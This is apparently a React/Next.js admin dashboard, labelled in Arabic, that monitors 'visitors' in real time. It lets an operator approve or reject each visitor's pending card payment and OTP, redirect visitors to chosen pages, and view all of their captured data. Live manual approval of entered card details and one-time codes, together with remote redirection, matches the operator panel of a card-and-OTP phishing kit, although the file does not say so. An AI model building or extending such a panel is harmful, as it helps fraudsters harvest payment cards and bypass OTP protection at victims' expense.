'use client';

import { useState, useEffect } from 'react';
import { api } from '@/lib/api';
import Link from 'next/link';

interface Visitor {
  vid: string;
  status: {
    online: boolean;
    lastSeen: string;
  };
  data?: any;
  payment?: any;
  otp?: any;
  verification?: any;
}

interface Statistics {
  total: number;
  online: number;
  pending_payment: number;
  pending_otp: number;
}

export default function AdminDashboard() {
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [statistics, setStatistics] = useState<Statistics | null>(null);
  const [loading, setLoading] = useState(true);
  const [selectedVisitor, setSelectedVisitor] = useState<Visitor | null>(null);

  useEffect(() => {
    loadData();
    const interval = setInterval(loadData, 3000); // Refresh every 3 seconds
    return () => clearInterval(interval);
  }, []);

  const loadData = async () => {
    try {
      const [visitorsData, statsData] = await Promise.all([
        api.admin.getVisitors(),
        api.admin.getStatistics(),
      ]);

      if (visitorsData.success) {
        setVisitors(visitorsData.visitors || []);
      }

      if (statsData.success) {
        setStatistics(statsData.statistics);
      }

      setLoading(false);
    } catch (error) {
      console.error('Error loading data:', error);
      setLoading(false);
    }
  };

  const handleApprovePayment = async (vid: string, approved: boolean) => {
    try {
      await api.admin.approvePayment(vid, approved);
      loadData();
    } catch (error) {
      console.error('Error approving payment:', error);
    }
  };

  const handleApproveOtp = async (vid: string, approved: boolean) => {
    try {
      await api.admin.approveOtp(vid, approved);
      loadData();
    } catch (error) {
      console.error('Error approving OTP:', error);
    }
  };

  const handleRedirect = async (vid: string, targetPage: string) => {
    try {
      await api.admin.redirectVisitor(vid, targetPage);
      loadData();
    } catch (error) {
      console.error('Error redirecting visitor:', error);
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="spinner"></div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-100" dir="rtl">
      <header className="bg-[#630527] text-white py-4 shadow-lg">
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between">
            <h1 className="text-2xl font-bold">لوحة التحكم - الإدارة</h1>
            <Link
              href="/"
              className="bg-white text-[#630527] px-4 py-2 rounded-lg hover:bg-gray-100 transition-colors"
            >
              الصفحة الرئيسية
            </Link>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-8">
        {/* Statistics Cards */}
        {statistics && (
          <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-8">
            <div className="bg-white rounded-lg shadow p-6">
              <div className="text-gray-600 text-sm mb-2">إجمالي الزوار</div>
              <div className="text-3xl font-bold text-gray-800">{statistics.total}</div>
            </div>
            <div className="bg-white rounded-lg shadow p-6">
              <div className="text-gray-600 text-sm mb-2">متصل الآن</div>
              <div className="text-3xl font-bold text-green-600">{statistics.online}</div>
            </div>
            <div className="bg-white rounded-lg shadow p-6">
              <div className="text-gray-600 text-sm mb-2">في انتظار الدفع</div>
              <div className="text-3xl font-bold text-yellow-600">{statistics.pending_payment}</div>
            </div>
            <div className="bg-white rounded-lg shadow p-6">
              <div className="text-gray-600 text-sm mb-2">في انتظار OTP</div>
              <div className="text-3xl font-bold text-blue-600">{statistics.pending_otp}</div>
            </div>
          </div>
        )}

        {/* Visitors Table */}
        <div className="bg-white rounded-lg shadow overflow-hidden">
          <div className="px-6 py-4 border-b border-gray-200">
            <h2 className="text-xl font-bold text-gray-800">قائمة الزوار</h2>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full">
              <thead className="bg-gray-50">
                <tr>
                  <th className="px-6 py-3 text-right text-xs font-medium text-gray-500 uppercase">ID</th>
                  <th className="px-6 py-3 text-right text-xs font-medium text-gray-500 uppercase">الحالة</th>
                  <th className="px-6 py-3 text-right text-xs font-medium text-gray-500 uppercase">الدفع</th>
                  <th className="px-6 py-3 text-right text-xs font-medium text-gray-500 uppercase">OTP</th>
                  <th className="px-6 py-3 text-right text-xs font-medium text-gray-500 uppercase">الإجراءات</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-200">
                {visitors.map((visitor) => (
                  <tr key={visitor.vid} className="hover:bg-gray-50">
                    <td className="px-6 py-4 whitespace-nowrap text-sm font-mono">
                      {visitor.vid.substring(0, 8)}...
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap">
                      <span className={`px-2 py-1 text-xs font-semibold rounded-full ${
                        visitor.status?.online
                          ? 'bg-green-100 text-green-800'
                          : 'bg-gray-100 text-gray-800'
                      }`}>
                        {visitor.status?.online ? 'متصل' : 'غير متصل'}
                      </span>
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap">
                      {visitor.payment?.card_status === 'pending' && (
                        <div className="flex gap-2">
                          <button
                            onClick={() => handleApprovePayment(visitor.vid, true)}
                            className="px-3 py-1 bg-green-500 text-white text-xs rounded hover:bg-green-600"
                          >
                            قبول
                          </button>
                          <button
                            onClick={() => handleApprovePayment(visitor.vid, false)}
                            className="px-3 py-1 bg-red-500 text-white text-xs rounded hover:bg-red-600"
                          >
                            رفض
                          </button>
                        </div>
                      )}
                      {visitor.payment?.card_status === 'approved' && (
                        <span className="text-green-600 text-sm">✓ مقبول</span>
                      )}
                      {visitor.payment?.card_status === 'rejected' && (
                        <span className="text-red-600 text-sm">✗ مرفوض</span>
                      )}
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap">
                      {visitor.otp?.otp_status === 'pending' && (
                        <div className="flex gap-2">
                          <button
                            onClick={() => handleApproveOtp(visitor.vid, true)}
                            className="px-3 py-1 bg-green-500 text-white text-xs rounded hover:bg-green-600"
                          >
                            قبول
                          </button>
                          <button
                            onClick={() => handleApproveOtp(visitor.vid, false)}
                            className="px-3 py-1 bg-red-500 text-white text-xs rounded hover:bg-red-600"
                          >
                            رفض
                          </button>
                        </div>
                      )}
                      {visitor.otp?.otp_status === 'approved' && (
                        <span className="text-green-600 text-sm">✓ مقبول</span>
                      )}
                      {visitor.otp?.otp_status === 'rejected' && (
                        <span className="text-red-600 text-sm">✗ مرفوض</span>
                      )}
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap">
                      <button
                        onClick={() => setSelectedVisitor(visitor)}
                        className="text-[#0876b1] hover:text-[#065681] text-sm font-medium"
                      >
                        عرض التفاصيل
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>

        {/* Visitor Details Modal */}
        {selectedVisitor && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
            <div className="bg-white rounded-lg shadow-xl max-w-4xl w-full max-h-[90vh] overflow-y-auto">
              <div className="px-6 py-4 border-b border-gray-200 flex justify-between items-center">
                <h3 className="text-xl font-bold text-gray-800">تفاصيل الزائر</h3>
                <button
                  onClick={() => setSelectedVisitor(null)}
                  className="text-gray-400 hover:text-gray-600"
                >
                  <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                  </svg>
                </button>
              </div>

              <div className="p-6">
                <pre className="bg-gray-50 p-4 rounded-lg overflow-x-auto text-sm">
                  {JSON.stringify(selectedVisitor, null, 2)}
                </pre>
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
